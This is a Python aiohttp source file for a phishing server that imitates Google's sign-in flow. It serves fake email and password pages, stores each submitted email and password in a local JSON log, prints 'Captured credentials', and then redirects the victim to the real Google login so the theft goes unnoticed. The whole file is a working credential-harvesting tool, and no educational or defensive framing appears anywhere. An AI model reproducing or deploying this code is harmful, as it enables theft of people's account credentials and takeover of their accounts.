from aiohttp import web
from jinja2 import Environment, FileSystemLoader
import json

env = Environment(loader=FileSystemLoader("templates"))

LOG_FILE = "logs/sessions.json"
SESSIONS = {}

async def handle_email_input(request):
    if request.method == "POST":
        data = await request.post()
        email = data.get("identifier", "")
        if email:
            SESSIONS["email"] = email
        raise web.HTTPFound("/password")
    template = env.get_template("google_email.html")
    return web.Response(text=template.render(), content_type="text/html")

async def handle_password_input(request):
    if request.method == "POST":
        data = await request.post()
        password = data.get("password", "")
        if password:
            SESSIONS["password"] = password
            log_entry = {
                "service": "google",
                "email": SESSIONS.get("email", ""),
                "password": password
            }
            save_log(log_entry)
            print(f"[+] Captured credentials: {log_entry}")
        return web.Response(text="Redirecting...", status=302, headers={"Location": "https://accounts.google.com"})
    
    template = env.get_template("google_password.html")
    return web.Response(text=template.render(email=SESSIONS.get("email", "")), content_type="text/html")

def save_log(entry):
    try:
        with open(LOG_FILE, "a") as f:
            json.dump(entry, f)
            f.write("\n")
    except Exception as e:
        print(f"Error saving log: {e}")

def start_proxy():
    app = web.Application()
    app.add_routes([
        web.get("/", handle_email_input),
        web.post("/", handle_email_input),
        web.get("/password", handle_password_input),
        web.post("/password", handle_password_input),
    ])
    print("[*] Proxy running at http://localhost:8000")
    web.run_app(app, port=8000)
